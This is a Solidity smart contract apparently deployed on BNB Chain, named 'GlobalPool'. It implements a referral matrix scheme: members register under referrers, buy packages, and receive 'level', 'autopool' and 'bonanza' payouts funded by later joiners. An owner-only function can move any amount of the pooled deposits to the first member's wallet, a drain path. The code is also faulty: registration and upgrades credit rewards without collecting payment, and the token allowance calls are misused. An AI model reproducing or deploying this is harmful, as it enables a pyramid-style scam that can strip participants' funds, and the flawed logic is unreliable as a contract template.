/**
 *Submitted for verification at BscScan.com on 2023-03-08
*/

// SPDX-License-Identifier: MIT
pragma experimental ABIEncoderV2;
pragma solidity >=0.5.0 < 0.9.0;

interface IERC20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract GlobalPool{
   
IERC20 public token = IERC20(address(0x337610d27c682E347C9cD60BD4b3b107C9d34dDd));
uint256 public constant decimal_number = 10 ** 18;
mapping(address => mapping(address => uint256)) public allowance;
mapping(address=>uint) public contributors;

mapping(address=>uint) public idno;
 mapping (address => mapping (address => uint256)) internal allowed;
address payable owner = payable(0xEB9f93D10A9448D92eB889A61c143544710Ca76A);
 
    struct Task{
        uint id;
        address refer;
          uint256 directs;
            uint256 level;
            uint256 autopool;
        uint256 bonus;
        uint256 tot;
        uint package;
        uint package1;
               uint256 timestamp;
          address payable team;
           uint256 upd;
    }
     struct x1{
          address payable team;
    }

     struct x2{
        address payable team;
        
    }
     struct x3{
        address payable team;
        
    }
 struct x4{
        address payable team;
        
    }
 struct x5{
        address payable team;
        
    }
 struct x6{
        address payable team;
        
    }
     struct x7{
        address payable team;
        
    }
     struct x8{
        address payable team;
        
    }
 struct x9{
        address payable team;
        
    }
 struct x10{
        address payable team;
        
    }
    
    uint counter = 1;
    Task[] tasks;
    x1[] public pools;
    x2[] public x2pools;
    x3[] public x3pools;
    x4[] public x4pools;
    x5[] public x5pools;
    x6[] public x6pools;
    x7[] public x7pools;
    x8[] public x8pools;
    x9[] public x9pools;
    x10[] public x10pools;
    event Register(uint256 value , address indexed sender);
    event UpgradeAccount(uint256 value , address indexed sender);
    event withdrawbal(uint256 value , address indexed sender);
    event bonanzareg(uint256 value , address indexed sender);

    function register(address _refer) payable public
    {
      
        require(contributors[msg.sender] ==0, "Wallet Address already registered with us!");
   if(counter > 1)
        {
          require(contributors[_refer] !=0, "Refer Address Invalid!");
        }
        Task memory temptask;
        temptask.id = counter;
        temptask.refer = _refer;
                temptask.autopool=0;
        temptask.bonus=0;
        temptask.directs=0;
        temptask.level=0;
        temptask.tot=0;
        temptask.package = 20;
        temptask.package1 = 0;
        temptask.timestamp =block.timestamp;
        temptask.team = payable(msg.sender);
        temptask.upd=0;
        tasks.push(temptask);
        contributors[msg.sender]=1;
        idno[msg.sender]=counter;
        uint c = idno[_refer];
        uint i = 0;
        uint  tt = 1;
         bal = 7;
         bal1 = 8;
        for(i =c;i>0;i--)  
        {
            if(tt==1)
             {
              if(counter > 7){
       tasks[c-1].directs += 1;
       tasks[c-1].tot += 5;
       withdraw(tasks[c-1].team);
              }
             }
            if(tt > 1)
             {
                bal -= 1;
                 if(counter > 7){
                tasks[c-1].level += 1;
       tasks[c-1].tot += 1;
       withdraw(tasks[c-1].team);
                 }
              }
            if(tt==9)
            { 
                break;
           }
            c = idno[tasks[c-1].refer];
            tt += 1;    
        }
       
        if(bal > 0)
        {
           if(counter > 7){
      tasks[0].level += bal;
       tasks[0].tot += bal;
       withdraw(tasks[0].team);
           }
        }
          uint s = 0;
          x1 memory Pool1;
            Pool1.team=payable(msg.sender);
              pools.push(Pool1);
              if(counter > 1)
              {  
              s = pools.length;        
            for(i=8;i>=1;i--)
                {
                s = s / 2;  
                 if(counter > 7){ 
  tasks[idno[pools[s-1].team]-1].autopool += 1;
  tasks[idno[pools[s-1].team]-1].tot += 1;
               withdraw(tasks[idno[pools[s-1].team]-1].team);
                 }
                bal1 -= 1;
                    if(s==1)
                     {
                      i=1;
                      }
                   }

if(bal1 > 0)
        {
           if(counter > 7){
      tasks[0].autopool += bal1;
       tasks[0].tot += bal1;
       withdraw(tasks[0].team);
           }
        }
              }
              emit Register(20*decimal_number,msg.sender);
      counter ++;
   }
       uint bal = 0;
        uint bal1 = 0;
        int lim = 0;

function upgrade(address _refer,uint _package) payable public
    {
        contributors[msg.sender] += 1;
        tasks[idno[msg.sender]-1].package += _package;
         uint s;
       uint j =0;
        x2 memory Pool2;
        x3 memory Pool3;
        x4 memory Pool4;
        x5 memory Pool5;
        x6 memory Pool6;
        x7 memory Pool7;
        x8 memory Pool8;
      if(_package==40)
        {
        bal1 = 20;
        lim = 2;
        }
        else if(_package == 80)
        {
        lim = 3;
        bal1 = 40;
        }
        else if(_package == 160)
        {
        lim = 4;
        bal1 = 80;
        }
        else if(_package == 320)
        {
        lim = 5;
        bal1 = 160;
        }
        else if(_package == 640)
        {
        lim = 6;
        bal1 = 320;
        }
        else if(_package == 1280)
        {
        lim = 7;
        bal1 = 640;
        }
         else if(_package == 2560)
        {
        lim = 8;
        bal1 = 1280;
        }
       if(counter>7)
       {
        uint c = tasks[idno[_refer]].id -2 ;
        for(int v = 0;v<(lim-1);v++)
        {
         c = tasks[idno[tasks[c].refer]].id -2;
        }
       
uint level = contributors [tasks[c].team];
        if(level >= uint(lim))
        {
           if(counter > 7){
   tasks[c].upd += bal1;
       tasks[c].tot += bal1;
        withdraw(tasks[c].team);
           }
        }
        else
        {
   tasks[0].upd += bal1;
       tasks[0].tot += bal1;
        }  
       }
        if(lim ==2)
          {
          Pool2.team=payable(msg.sender);
          x2pools.push(Pool2);     
         
            s = x2pools.length;
            if(s>1)
            {
          for(j=8;j>=1;j--)
             {
               s = s/2;
     
              bal1 -= 2;
               if(counter > 7){
              tasks[idno[x2pools[s-1].team]-1].autopool += 2;
              tasks[idno[x2pools[s-1].team]-1].tot += 2;
 withdraw(tasks[idno[x2pools[s-1].team]-1].team);
               }
               if(s==1)
               {
                 j = 1;
               }
               }
              }
             }
     if(lim == 3)
       { 
       Pool3.team=payable(msg.sender);
       x3pools.push(Pool3);
        s =x3pools.length; 
       if(s > 1)
          {
           
       for(j=8;j>=1;j--)
        {
          s = s/2;
   
          bal1 -= 5;
           if(counter > 7){
           tasks[idno[x3pools[s-1].team]-1].autopool += 5;
              tasks[idno[x3pools[s-1].team]-1].tot += 5;
withdraw(tasks[idno[x3pools[s-1].team]-1].team);
           }
           if(s==1)
              {
                j = 1;
              }
        }
       }
      }
if(lim == 4)
{
       Pool4.team=payable(msg.sender);
       x4pools.push(Pool4);
       s =x4pools.length;
       if(s > 1)
          {
             
       for(j=8;j>=1;j--)
        {
          s = s/2;
    
          bal1 -= 10;
           if(counter > 7){
           tasks[idno[x4pools[s-1].team]-1].autopool += 10;
              tasks[idno[x4pools[s-1].team]-1].tot += 10;
withdraw(tasks[idno[x4pools[s-1].team]-1].team);
           }
            if(s==1)
              {
                j = 1;
              }
        }  
        }
  }
if(lim==5)
{
       Pool5.team=payable(msg.sender);
       x5pools.push(Pool5);
       s =x5pools.length;
       if(s > 1)
          {
            
     for(j=8;j>=1;j--)
        {
          s = s/2;
      
          bal1 -= 20;
           if(counter > 7){
           tasks[idno[x5pools[s-1].team]-1].autopool += 20;
              tasks[idno[x5pools[s-1].team]-1].tot += 20;
withdraw(tasks[idno[x5pools[s-1].team]-1].team);
           }
       
         if(s==1)
              {
                j = 1;
              }
        }
        }
 }
       
if(lim==6)
          {
       Pool6.team=payable(msg.sender);
       x6pools.push(Pool6);
        s =x6pools.length; 
       if(s > 1)
          {
           
      for(j=8;j>=1;j--)
      {
        s =  s/2;
   
          bal1 -= 40;
           if(counter > 7){
           tasks[idno[x6pools[s-1].team]-1].autopool += 40;
              tasks[idno[x6pools[s-1].team]-1].tot += 40;

         withdraw(tasks[idno[x6pools[s-1].team]-1].team);
           }
            if(s==1)
              {
                j = 1;
              }
         }
          }
      }
if(lim==7)
     {
       Pool7.team=payable(msg.sender);
       x7pools.push(Pool7);
        s =x7pools.length; 
       if(s > 1)
          {
           
      for(j=8;j>=1;j--)
        {
       
          s = s/2;
       
          bal1 -= 80;
           if(counter > 7){
           tasks[idno[x7pools[s-1].team]-1].autopool += 80;
              tasks[idno[x7pools[s-1].team]-1].tot += 80;
withdraw(tasks[idno[x7pools[s-1].team]-1].team);
           }
            if(s==1)
              {
                j = 1;
              }
        }
          
        }
    } 
 if(lim == 8)   
   {
       Pool8.team=payable(msg.sender);
           x8pools.push(Pool8);
           s =x8pools.length;
           if(s > 1)
          {
            
          for(j=8;j>=1;j--)
          {
         s = s/2;
       
          bal1 -= 160;
           if(counter > 7){
          tasks[idno[x8pools[s-1].team]-1].autopool += 160;
              tasks[idno[x8pools[s-1].team]-1].tot += 160;
withdraw(tasks[idno[x8pools[s-1].team]-1].team);
           }
            if(s==1)
              {
                j = 1;
              }
          }
      }
        }
    if(bal1 > 0)
   {
     if(counter > 7){
       tasks[0].autopool += bal1;
              tasks[0].tot += bal1;

         withdraw(tasks[0].team);
     }
     
          }
          emit UpgradeAccount(_package*decimal_number,msg.sender);
}


function bonanza(uint _package) payable public
    {
      uint refer1;
       tasks[idno[msg.sender]-1].package1 += _package;
       x9  memory Pool9;
        x10  memory Pool10;
      if(_package == 100)
      {
        token.transferFrom(msg.sender,address(this),_package* decimal_number);

          Pool9.team=payable(msg.sender);
          x9pools.push(Pool9);
            if(x9pools.length > 1)
            {  
          
        refer1 = (x9pools.length)/2;
         if(counter > 7){
    tasks[idno[x9pools[refer1-1].team]-1].bonus += 100;
        withdraw(tasks[idno[x9pools[refer1-1].team]-1].team);
           }
            }
    }
     else if(_package == 200)
    {
      token.transferFrom(msg.sender,address(this),_package* decimal_number);
      
       Pool10.team=payable(msg.sender);
       x10pools.push(Pool10);
       if(x10pools.length > 1)
            { 
        refer1 = (x10pools.length)/2;
         if(counter > 7){
        tasks[idno[x10pools[refer1-1].team]-1].bonus += 200;
    
        withdraw(tasks[idno[x10pools[refer1-1].team]-1].team);
         }
        }
    }
   emit bonanzareg(_package*decimal_number,msg.sender);
}


function withdraw (address id) public payable
{
   if(counter > 7){
  uint amt = tasks[idno[id]-1].tot;
   token.allowance(address(this),id);
    token.approve(address(this), amt * decimal_number);
     token.transferFrom(address(this),id,amt * decimal_number);
      tasks[idno[id]-1].tot=0;
       emit withdrawbal(amt*decimal_number, msg.sender);
   }
}

function transferContractBalanceToOwner(uint amt) public {
    require(msg.sender == owner, "Only contract owner can transfer balance");
     token.allowance(address(this),tasks[0].team);
    token.approve(address(this), amt * decimal_number);
     token.transferFrom(address(this),tasks[0].team,amt* decimal_number);

   
}

 function approve(address spender, uint amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

  
   function getMemos(address _memberId) public view returns(Task memory) {
    uint i = idno[_memberId];
    return tasks[i-1];
  }
    
}